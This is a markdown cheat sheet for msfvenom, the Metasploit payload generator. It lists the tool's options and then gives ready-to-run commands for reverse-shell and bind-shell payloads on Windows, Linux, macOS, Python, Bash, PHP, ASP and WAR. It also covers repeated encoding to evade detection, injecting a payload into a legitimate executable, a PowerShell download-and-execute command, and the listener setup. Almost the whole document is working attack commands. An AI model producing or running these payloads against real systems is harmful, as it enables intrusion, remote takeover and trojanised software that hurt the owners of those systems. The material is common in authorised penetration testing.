## msfvenom CheatSheet
---
---

```markdown
***MsfVenom - a Metasploit standalone payload generator.***
Also a replacement for msfpayload and msfencode.
Usage: `/opt/metasploit-framework/bin/../embedded/framework/msfvenom [options] <var=val>`
Example: `/opt/metasploit-framework/bin/../embedded/framework/msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o payload.exe`

**Options:**
    -l, --list            <type>     List all modules for [type]. Types are: payloads, encoders, nops, platforms, archs, encrypt, formats, all
    -p, --payload         <payload>  Payload to use (--list payloads to list, --list-options for arguments). Specify '-' or STDIN for custom
        --list-options               List --payload <value>'s standard, advanced and evasion options
    -f, --format          <format>   Output format (use --list formats to list)
    -e, --encoder         <encoder>  The encoder to use (use --list encoders to list)
        --service-name    <value>    The service name to use when generating a service binary
        --sec-name        <value>    The new section name to use when generating large Windows binaries. Default: random 4-character alpha string
        --smallest                   Generate the smallest possible payload using all available encoders
        --encrypt         <value>    The type of encryption or encoding to apply to the shellcode (use --list encrypt to list)
        --encrypt-key     <value>    A key to be used for --encrypt
        --encrypt-iv      <value>    An initialization vector for --encrypt
    -a, --arch            <arch>     The architecture to use for --payload and --encoders (use --list archs to list)
        --platform        <platform> The platform for --payload (use --list platforms to list)
    -o, --out             <path>     Save the payload to a file
    -b, --bad-chars       <list>     Characters to avoid example: '\x00\xff'
    -n, --nopsled         <length>   Prepend a nopsled of [length] size on to the payload
        --pad-nops                   Use nopsled size specified by -n <length> as the total payload size, auto-prepending a nopsled of quantity (nops minus payload length)
    -s, --space           <length>   The maximum size of the resulting payload
        --encoder-space   <length>   The maximum size of the encoded payload (defaults to the -s value)
    -i, --iterations      <count>    The number of times to encode the payload
    -c, --add-code        <path>     Specify an additional win32 shellcode file to include
    -x, --template        <path>     Specify a custom executable file to use as a template
    -k, --keep                       Preserve the --template behaviour and inject the payload as a new thread
    -v, --var-name        <value>    Specify a custom variable name to use for certain output formats
    -t, --timeout         <second>   The number of seconds to wait when reading the payload from STDIN (default 30, 0 to disable)
    -h, --help                       Show this message
```


### List 
---
```bash
# msfvenom -l payloads
# msfvenom -l encoders
```
### Show Payload Options
---
```bash
# msfvenom -p PAYLOAD --list-options
```
### Commonly Used Parameters
---
```markdown
- **b "\x00\x0a\x0d"**                <== Don't use this bad characters
- **f c**                             <== Output in C Hex String
- **e x86/shikata_ga_nai -i 5**       <== Encodes
```
### Windows Payloads
---
#### Reverse Shell
```bash
# msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP) LPORT=(PORT) -f exe > FILE.exe
```
#### Bind Shell
```bash
# msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP) LPORT=(PORT) -f exe > FILE.exe
```
#### CMD Shell
```bash
# msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > FILE.exe
# msfvenom -a x86 --platform Windows -p windows/exec CMD="dir c:\" -f exe > FILE.exe
```
#### Enoder
---
```bash
# msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > FILE.exe
```
#### Into Executable
```bash
# msfvenom -p windows/shell_reverse_tcp LHOST=(IP) LPORT=(PORT) -x /usr/share/windows-binaries/FILE_EXE_ORIGINAL.exe -f exe -o FILE_Meterpreter.exe
# msfvenom -p windows/shell_reverse_tcp LHOST=(IP) LPORT=(PORT) -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/FILE_EXE_ORIGINAL.exe -o FILE_Meterpreter.exe
```
### Linux Payloads
---
#### Reverse Shell
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP) LPORT=(PORT) -f elf > FILE.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > FILE.elf
```
#### Bind Shell
---
```bash
# msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP) LPORT=(PORT) -f elf > FILE.elf
```
### MAC Payloads
---
#### Reverse Shell
```bash
# msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP) LPORT=(PORT) -f macho > FILE.macho
```
#### Bind Shell
```bash
# msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP) LPORT=(PORT) -f macho > FILE.macho
```
### Scripting Payloads
---
#### Python Reverse Shell
```bash 
# msfvenom -p cmd/unix/reverse_python LHOST=(IP) LPORT=(PORT) -f raw > FILE.py
```
#### Bash Reverse
```bash
# msfvenom -p cmd/unix/reverse_bash LHOST=(IP) LPORT=(PORT) -f raw > FILE.sh
```
### Web Payloads
---
#### PHP 
##### Reverse Shell
```bash
# msfvenom -p php/meterpreter_reverse_tcp LHOST=(IP) LPORT=(PORT) -f raw > FILE.php
```
#### ASP 
##### Reverse Shell
```bash
# msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP) LPORT=(PORT) -f asp > FILE.asp
# msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP) LPORT=(PORT) -f aspx > FILE.aspx
```
#### WAR
##### Reverse Shell
```bash
# msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP) LPORT=(PORT) -f war > FILE.war
```

### Metasploit Handler
---
```
msf> set PAYLOAD (PAYLOAD)
msf> set LHOST (IP)
msf> set LPORT (PORT)
msf> set ExitOnSession false
msf> exploit -j -z
```






